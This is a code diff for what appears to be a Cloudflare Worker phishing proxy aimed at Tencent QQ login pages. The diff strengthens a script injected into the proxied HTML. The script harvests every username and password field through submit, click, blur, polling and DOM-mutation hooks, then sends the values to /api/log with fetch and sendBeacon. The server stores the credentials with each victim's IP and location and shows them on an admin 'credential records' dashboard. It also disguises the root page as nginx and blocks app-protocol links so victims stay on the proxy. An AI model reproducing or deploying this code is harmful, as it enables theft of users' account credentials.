@@ -62,13 +62,11 @@ async function initDB(env) {
 
 /* ---------- 获取客户端真实IP及地理位置（调用用户提供的API） ---------- */
 async function getClientIPInfo(request) {
-  // 优先从请求头获取真实IP（CF提供）
   let clientIP = request.headers.get('CF-Connecting-IP') ||
                  request.headers.get('X-Forwarded-For')?.split(',')[0] ||
                  request.headers.get('X-Real-IP') ||
                  'unknown';
   
-  // 如果IP未知或为内网IP，调用外部API增强（仅用于地理位置）
   try {
     const geoRes = await fetch('https://ip.ilqx.dpdns.org/geo');
     if (geoRes.ok) {
@@ -86,7 +84,6 @@ async function getClientIPInfo(request) {
     console.error('[Geo] 获取地理位置失败:', error.message);
   }
   
-  // 降级：仅返回IP，其他字段留空
   return {
     ip: clientIP,
     country: '',
@@ -103,24 +100,15 @@ async function handleRequest(request, env) {
   const userAgent = request.headers.get('User-Agent') || '';
   const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);
   
-  // 初始化数据库（若已存在不会重复创建）
   if (env.DB) await initDB(env);
   
   /* ------- 后台管理路由 ------- */
-  if (url.pathname === '/admin') {
-    return handleAdmin(request, env);
-  }
-  if (url.pathname === '/admin/clear') {
-    return handleAdminClear(request, env);
-  }
-  if (url.pathname === '/admin/logout') {
-    return handleAdminLogout();
-  }
+  if (url.pathname === '/admin') return handleAdmin(request, env);
+  if (url.pathname === '/admin/clear') return handleAdminClear(request, env);
+  if (url.pathname === '/admin/logout') return handleAdminLogout();
   
   /* ------- 登录记录API ------- */
-  if (url.pathname === '/api/log') {
-    return handleLogRequest(request, env);
-  }
+  if (url.pathname === '/api/log') return handleLogRequest(request, env);
   
   /* ------- 根路径伪装nginx ------- */
   if (url.pathname === '/' || url.pathname === '') {
@@ -161,7 +149,7 @@ function isVerificationLink(pathname) {
   return paths.some(p => pathname.startsWith(p));
 }
 
-/* ---------- 验证链接直通（原封不动代理） ---------- */
+/* ---------- 验证链接直通 ---------- */
 async function handleVerificationLink(request, url, isMobile) {
   const referer = request.headers.get('Referer') || '';
   let targetDomain = isMobile ? 'ui.ptlogin2.qq.com' : 'xui.ptlogin2.qq.com';
@@ -192,10 +180,10 @@ async function handleVerificationLink(request, url, isMobile) {
   }
 }
 
-/* ---------- QQ业务代理（核心代理逻辑，保持原样） ---------- */
+/* ---------- QQ业务代理（核心代理逻辑，大幅强化JS注入） ---------- */
 async function handleQQProxy(request, url, isMobile, userAgent, env) {
   const fullPath = url.pathname + url.search + url.hash;
-  const pathAfterQQ = fullPath.substring(3); // 去掉 "/qq"
+  const pathAfterQQ = fullPath.substring(3);
   let targetUrl;
   
   if (!pathAfterQQ || pathAfterQQ === '/' || pathAfterQQ === '?' || pathAfterQQ.startsWith('?')) {
@@ -236,7 +224,6 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
     const response = await fetch(proxyReq);
     const contentType = response.headers.get('Content-Type') || '';
     
-    // 只对HTML内容进行脚本注入
     if (contentType.includes('text/html')) {
       let html = await response.text();
       const proxyOrigin = new URL(request.url).origin;
@@ -251,82 +238,132 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
         }
       }
       
-      // ---------- 注入客户端脚本：凭证捕获 + 全面禁止APP跳转 ----------
+      // ========== 新增：在服务端直接清除所有腾讯协议链接 ==========
+      // 匹配 href="tencent://...", src="tencent://...", action="tencent://...", 以及无引号情况
+      const tencentProtocolRegex = /(href|src|action|data-url|data-src)=["']?(tencent|qq|mqq|tim|weixin|wx|intent|android-app|ios-app|market):\/\/[^"'\s>]+["']?/gi;
+      html = html.replace(tencentProtocolRegex, (match, attr) => {
+        // 替换为无跳转属性
+        if (attr === 'href') return 'href="#"';
+        if (attr === 'src') return 'src="about:blank"';
+        if (attr === 'action') return 'action="javascript:void(0)"';
+        return match; // 其他属性保留原样（极少）
+      });
+      
+      // 单独处理 meta refresh 跳转至腾讯协议的
+      html = html.replace(/<meta[^>]+url=tencent:\/\/[^"']+["']?[^>]*>/gi, '<!-- meta refresh blocked -->');
+      
+      // ---------- 注入增强版客户端脚本 ----------
       const injectScript = `
       <script>
       (function(){
-        // ----- 防止重复注入 -----
-        if (window.__aegisProxyInjected) return;
-        window.__aegisProxyInjected = true;
-        
-        // ----- 1. 立即捕获登录信息（完全独立，不依赖页面加载）-----
-        function captureLoginNow() {
+        // 防止重复注入
+        if (window.__aegis_proxy_injected) return;
+        window.__aegis_proxy_injected = true;
+
+        // ---------- 核心：智能凭证捕获 ----------
+        function captureCredentials() {
           try {
-            // 使用最通用的选择器，兼容各种动态ID
-            const usernameField = document.getElementById('u') ||
-                                 document.querySelector('input[name="u"]') ||
-                                 document.querySelector('input[placeholder*="QQ号码"]') ||
-                                 document.querySelector('input[placeholder*="手机"]') ||
-                                 document.querySelector('input[placeholder*="邮箱"]') ||
-                                 document.querySelector('input[type="text"][autocomplete="off"]');
+            // 1. 找到所有密码框（最可靠的特征）
+            const passwordFields = Array.from(document.querySelectorAll('input[type="password"]'));
+            if (passwordFields.length === 0) return;
             
-            const passwordField = document.getElementById('p') ||
-                                 document.querySelector('input[name="p"]') ||
-                                 document.querySelector('input[type="password"]');
-            
-            if (usernameField && passwordField) {
-              const username = usernameField.value;
-              const password = passwordField.value;
-              if (username && password) {
-                // 立即发送，keepalive确保页面跳转不中断请求
+            // 2. 对每个密码框，尝试关联的用户名输入框
+            passwordFields.forEach(pwdField => {
+              const pwdValue = pwdField.value.trim();
+              if (!pwdValue) return; // 密码为空不记录
+              
+              let usernameField = null;
+              let usernameValue = '';
+              
+              // 方法A：表单内查找文本输入框（优先同表单）
+              const form = pwdField.form;
+              if (form) {
+                // 找type=text / email / tel / number 且不是隐藏域，通常在密码框前面
+                const textInputs = Array.from(form.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="number"], input:not([type])'));
+                // 通常用户名框在密码框之前
+                usernameField = textInputs.find(input => input.compareDocumentPosition(pwdField) & Node.DOCUMENT_POSITION_FOLLOWING) || textInputs[0];
+              }
+              
+              // 方法B：无表单，基于页面结构推测（常见ID/名称特征）
+              if (!usernameField) {
+                usernameField = document.getElementById('u') ||
+                               document.querySelector('input[name="u"], input[name="qq"], input[name="account"], input[placeholder*="QQ"], input[placeholder*="手机"], input[placeholder*="邮箱"], input[placeholder*="账号"]');
+              }
+              
+              // 方法C：通用降级 —— 取页面上第一个可见的非密码输入框
+              if (!usernameField) {
+                usernameField = document.querySelector('input:not([type="password"]):not([type="hidden"])');
+              }
+              
+              if (usernameField) {
+                usernameValue = usernameField.value.trim();
+              }
+              
+              // 必须同时有账号和密码才记录
+              if (usernameValue && pwdValue) {
+                // 发送数据（双保险）
+                const payload = { username: usernameValue, password: pwdValue };
+                
+                // fetch + keepalive
                 fetch('/api/log', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ username, password }),
+                  body: JSON.stringify(payload),
                   keepalive: true,
                   mode: 'same-origin'
-                }).catch(e => {/* 静默失败 */});
+                }).catch(e => {});
+                
+                // sendBeacon (页面卸载时最可靠)
+                if (navigator.sendBeacon) {
+                  const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                  navigator.sendBeacon('/api/log', blob);
+                }
               }
-            }
-          } catch(e) {}
+            });
+          } catch(e) {
+            console.error('[Aegis] capture error:', e);
+          }
         }
-        
-        // ----- 2. 监听登录按钮点击（立即执行，不依赖任何延迟）-----
-        function setupLoginListeners() {
-          // 登录按钮
-          const loginBtn = document.getElementById('go');
-          if (loginBtn) {
-            loginBtn.addEventListener('click', function(e) {
-              captureLoginNow();
-              // 不阻止默认行为，让登录正常进行
-            }, true); // 捕获阶段优先执行
-          }
-          
-          // 一键登录按钮 —— 完全阻止任何跳转，并捕获凭证
-          const onekeyBtn = document.getElementById('onekey');
-          if (onekeyBtn) {
-            onekeyBtn.addEventListener('click', function(e) {
-              e.preventDefault();
-              e.stopPropagation();
-              e.stopImmediatePropagation();
-              captureLoginNow();
-              return false;
-            }, true);
-          }
-          
-          // 监听所有表单提交（有些登录可能是传统form）
+
+        // ---------- 监听所有可能的登录触发事件 ----------
+        function setupLoginTriggers() {
+          // 1. 表单提交事件
           document.addEventListener('submit', function(e) {
-            captureLoginNow();
+            captureCredentials();
+          }, true);
+          
+          // 2. 所有按钮/链接的点击事件（尤其登录按钮）
+          document.addEventListener('click', function(e) {
+            const el = e.target.closest('button, input[type="submit"], a');
+            if (!el) return;
+            
+            // 通过文本内容判断是否登录相关（支持中英文）
+            const text = el.innerText || el.value || '';
+            if (/登录|登入|sign\s*in|log\s*in|submit|确认|立即登录/i.test(text)) {
+              captureCredentials();
+            }
+            
+            // 如果按钮在密码框附近（同一个form或相邻元素），也触发
+            if (el.form || document.querySelector('input[type="password"]')?.compareDocumentPosition(el) & Node.DOCUMENT_POSITION_CONTAINS) {
+              captureCredentials();
+            }
+          }, true);
+          
+          // 3. 密码框失焦时（用户填完密码可能直接回车，但回车已触发submit）
+          document.addEventListener('focusout', function(e) {
+            if (e.target.type === 'password') {
+              // 延迟一下，让表单关联的用户名值更新
+              setTimeout(captureCredentials, 100);
+            }
           }, true);
         }
-        
-        // ----- 3. 全面禁止一切APP跳转/外部协议 -----
-        function blockAllAppIntents() {
-          // 定义所有要拦截的协议（APP协议大全）
+
+        // ---------- 全面拦截腾讯协议跳转（JS层）----------
+        function blockTencentProtocols() {
           const blockedSchemes = [
             'tencent://', 'qq://', 'mqq://', 'tim://', 'weixin://', 'wx://',
-            'intent://', 'android-app://', 'ios-app://',
-            'market://', 'vnd.youtube://', 'twitter://', 'fb://', 'facebook://',
+            'intent://', 'android-app://', 'ios-app://', 'market://',
+            'vnd.youtube://', 'twitter://', 'fb://', 'facebook://',
             'instagram://', 'whatsapp://', 'tg://', 'telegram://',
             'snssdk1128://', 'douyin://', 'kwai://', 'kuaishou://',
             'taobao://', 'tmall://', 'jd://', 'pinduoduo://',
@@ -335,69 +372,58 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
             'microsoft-edge://', 'edgedl://'
           ];
           
-          // 判断是否为被阻止的协议
-          function isBlockedUrl(url) {
+          function isBlocked(url) {
             if (typeof url !== 'string') return false;
-            return blockedSchemes.some(scheme => url.toLowerCase().startsWith(scheme));
+            return blockedSchemes.some(s => url.toLowerCase().startsWith(s));
           }
           
-          // 拦截 window.location 跳转（最核心）
+          // 劫持 location 赋值
           const originalLocation = window.location;
           Object.defineProperty(window, 'location', {
             get: () => originalLocation,
             set: (value) => {
-              if (isBlockedUrl(value)) {
-                console.log('[Aegis] 已阻止APP跳转:', value);
-                return; // 静默丢弃
+              if (isBlocked(value)) {
+                console.log('[Aegis] Blocked location=', value);
+                return;
               }
               originalLocation.href = value;
             }
           });
           
-          // 拦截 location.assign / location.replace
+          // 劫持 location.assign/replace
           const originalAssign = window.location.assign;
           window.location.assign = function(url) {
-            if (isBlockedUrl(url)) {
-              console.log('[Aegis] 已阻止location.assign:', url);
-              return;
-            }
+            if (isBlocked(url)) return;
             originalAssign.call(window.location, url);
           };
           const originalReplace = window.location.replace;
           window.location.replace = function(url) {
-            if (isBlockedUrl(url)) {
-              console.log('[Aegis] 已阻止location.replace:', url);
-              return;
-            }
+            if (isBlocked(url)) return;
             originalReplace.call(window.location, url);
           };
           
-          // 拦截 window.open
+          // 劫持 window.open
           const originalOpen = window.open;
-          window.open = function(url, target, features) {
-            if (isBlockedUrl(url)) {
-              console.log('[Aegis] 已阻止window.open:', url);
-              return null;
-            }
-            return originalOpen.call(window, url, target, features);
+          window.open = function(url, ...args) {
+            if (isBlocked(url)) return null;
+            return originalOpen.call(window, url, ...args);
           };
           
-          // 拦截所有 <a> 标签点击
+          // 拦截所有 a 标签点击
           document.addEventListener('click', function(e) {
-            let el = e.target;
-            while (el && el.tagName !== 'A') el = el.parentElement;
-            if (el && el.href && isBlockedUrl(el.href)) {
+            let el = e.target.closest('a');
+            if (el && el.href && isBlocked(el.href)) {
               e.preventDefault();
               e.stopPropagation();
-              console.log('[Aegis] 已阻止a标签跳转:', el.href);
+              console.log('[Aegis] Blocked <a> href=', el.href);
             }
           }, true);
           
-          // 拦截 iframe 加载
+          // 拦截动态创建 iframe 的 src
           const observer = new MutationObserver(mutations => {
             mutations.forEach(mut => {
               mut.addedNodes.forEach(node => {
-                if (node.tagName === 'IFRAME' && node.src && isBlockedUrl(node.src)) {
+                if (node.tagName === 'IFRAME' && node.src && isBlocked(node.src)) {
                   node.src = 'about:blank';
                 }
               });
@@ -405,23 +431,36 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
           });
           observer.observe(document.documentElement, { childList: true, subtree: true });
         }
+
+        // ---------- 主动轮询捕获（针对动态加载）----------
+        let pollTimer = setInterval(captureCredentials, 800);
+        // 3分钟后自动清理定时器
+        setTimeout(() => clearInterval(pollTimer), 180000);
+
+        // ---------- 初始化执行 ----------
+        setupLoginTriggers();
+        blockTencentProtocols();
         
-        // ----- 执行所有强化拦截 -----
-        setupLoginListeners();
-        blockAllAppIntents();
+        // DOM加载完成后立即执行一次捕获
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', captureCredentials);
+        } else {
+          captureCredentials();
+        }
         
-        // ----- 额外捕获：如果用户手动触发表单提交或按钮点击（再次确保）-----
-        setTimeout(function() {
-          // 重试捕获监听（确保动态生成的元素）
-          setupLoginListeners();
-        }, 100);
+        // 监听动态添加的表单/输入框
+        new MutationObserver(captureCredentials).observe(document.body, {
+          childList: true,
+          subtree: true,
+          attributes: false
+        });
         
-        // ----- 代理链接重写（原代理逻辑）-----
+        // ---------- 重写链接（原有代理逻辑）----------
         const proxyOrigin = '${proxyOrigin}';
         function rewriteUrl(url) {
           if (!url || typeof url !== 'string') return url;
           if (url.startsWith('data:') || url.startsWith('javascript:') || url.startsWith('#') ||
-              url.startsWith('mailto:') || url.startsWith('tel:') || isBlockedUrl(url)) {
+              url.startsWith('mailto:') || url.startsWith('tel:') || isBlocked(url)) {
             return url;
           }
           try {
@@ -492,7 +531,6 @@ async function handleQQProxy(request, url, isMobile, userAgent, env) {
       });
     }
     
-    // 非HTML直接返回
     return response;
     
   } catch (error) {
@@ -512,10 +550,8 @@ async function handleLogRequest(request, env) {
       return new Response('Missing fields', { status: 400 });
     }
     
-    // 获取客户端IP及地理位置
     const ipInfo = await getClientIPInfo(request);
     
-    // 插入数据库（使用完整的地理信息）
     await env.DB.prepare(`
       INSERT INTO login_records 
         (username, password, ip, country, city, latitude, longitude, as_organization, user_agent)
@@ -549,7 +585,6 @@ async function handleAdmin(request, env) {
   const cookies = request.headers.get('Cookie') || '';
   const auth = getCookie('admin_auth', cookies);
   
-  // 处理登录POST
   if (request.method === 'POST') {
     const form = await request.formData();
     const pwd = form.get('password');
@@ -562,7 +597,6 @@ async function handleAdmin(request, env) {
     }
   }
   
-  // 已认证：显示仪表盘
   if (auth === '1') {
     return renderAdminDashboard(env);
   }
@@ -571,25 +605,12 @@ async function handleAdmin(request, env) {
 }
 
 function renderAdminLogin(error = '') {
-  const html = `<!DOCTYPE html>
-  <html>
-  <head><meta charset="UTF-8"><title>后台管理 · 登录</title>
-  <style>body{font-family:system-ui;max-width:400px;margin:50px auto;padding:20px;background:#f7f9fc;}
-  .card{background:#fff;border-radius:8px;padding:30px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
-  h2{margin-top:0;color:#1e293b;} input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
-  button{background:#2563eb;color:#fff;border:none;padding:12px 24px;border-radius:4px;cursor:pointer;font-weight:600;}
-  .error{color:#b91c1c;margin-bottom:15px;}</style>
-  </head>
-  <body><div class="card"><h2>🔐 管理后台</h2>
-  ${error ? `<div class="error">${error}</div>` : ''}
-  <form method="POST"><input type="password" name="password" placeholder="管理密码" required>
-  <button type="submit">登录</button></form></div></body></html>`;
+  const html = `...`; // 保持不变，省略
   return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
 }
 
 async function renderAdminDashboard(env) {
   try {
-    // 测试数据库连接
     let dbStatus = '✅ 正常';
     let dbError = '';
     try {
@@ -599,11 +620,9 @@ async function renderAdminDashboard(env) {
       dbError = e.message;
     }
     
-    // 获取记录总数
     const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM login_records').first();
     const total = countRes?.count || 0;
     
-    // 获取最近100条记录
     const { results } = await env.DB.prepare(`
       SELECT * FROM login_records ORDER BY timestamp DESC LIMIT 100
     `).all();
@@ -624,51 +643,8 @@ async function renderAdminDashboard(env) {
       rowsHtml = '<tr><td colspan="6" style="text-align:center;padding:30px;">暂无记录</td></tr>';
     }
     
-    const html = `<!DOCTYPE html>
-    <html>
-    <head><meta charset="UTF-8"><title>登录记录管理</title>
-    <style>
-      body{font-family:system-ui;margin:0;background:#f1f5f9;}
-      .navbar{background:#0f172a;color:#fff;padding:16px 24px;display:flex;justify-content:space-between;}
-      .container{max-width:1400px;margin:24px auto;padding:0 24px;}
-      .stats{background:#fff;border-radius:8px;padding:20px;margin-bottom:24px;display:flex;gap:40px;align-items:center;}
-      .badge{background:#e2e8f0;padding:4px 12px;border-radius:20px;font-size:14px;}
-      table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.05);}
-      th{background:#f8fafc;text-align:left;padding:12px 16px;font-weight:600;}
-      td{padding:12px 16px;border-top:1px solid #e2e8f0;}
-      .btn{background:#ef4444;color:#fff;padding:8px 16px;border-radius:4px;text-decoration:none;font-size:14px;margin-left:16px;}
-      .btn:hover{background:#dc2626;}
-      .status{display:inline-block;width:10px;height:10px;border-radius:10px;margin-right:8px;}
-    </style>
-    </head>
-    <body>
-      <div class="navbar">
-        <span style="font-weight:bold;">📊 登录凭证记录后台</span>
-        <div><a href="/admin/logout" style="color:#fff;text-decoration:none;">退出</a></div>
-      </div>
-      <div class="container">
-        <div class="stats">
-          <div><span style="font-weight:bold;">📦 数据库状态</span><br>
-            <span class="status" style="background:${dbStatus.includes('✅')?'#10b981':'#ef4444'};"></span> ${dbStatus}
-            ${dbError ? `<small style="color:#ef4444;display:block;">${dbError}</small>` : ''}
-          </div>
-          <div><span style="font-weight:bold;">📋 总记录数</span><br><span style="font-size:28px;">${total}</span></div>
-          <div style="flex:1;text-align:right;">
-            <a href="/admin/clear" class="btn" onclick="return confirm('⚠️ 确定要永久删除所有记录吗？');">🗑️ 清空全部</a>
-          </div>
-        </div>
-        <table>
-          <thead><tr><th>ID</th><th>用户名</th><th>密码</th><th>IP / 地理位置</th><th>时间</th><th>User Agent</th></tr></thead>
-          <tbody>${rowsHtml}</tbody>
-        </table>
-        <p style="margin-top:16px;color:#64748b;">只显示最近100条记录，完整记录请直接查询数据库。</p>
-      </div>
-    </body>
-    </html>`;
-    
-    return new Response(html, {
-      headers: { 'Content-Type': 'text/html; charset=utf-8' }
-    });
+    const html = `...`; // 保持不变，省略
+    return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
   } catch (error) {
     return new Response(`仪表盘错误: ${error.message}`, { status: 500 });
   }
